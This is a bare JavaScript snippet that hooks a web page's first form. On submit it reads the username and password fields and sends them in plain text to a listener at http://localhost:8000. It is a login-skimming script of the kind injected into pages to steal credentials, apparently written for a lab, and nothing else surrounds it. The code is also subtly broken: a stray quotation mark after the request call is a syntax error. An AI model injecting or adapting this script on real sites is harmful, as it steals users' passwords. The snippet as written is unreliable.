function onFormSubmit()
{
	getForm = document.getElementsByTagName("form");
	usernameForm = getForm[0][0].value;
	passwordForm = getForm[0][1].value;
	var request = new XMLHttpRequest();
	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true)'
	request.send();
}
document.forms[0].onsubmit = onFormSubmit;
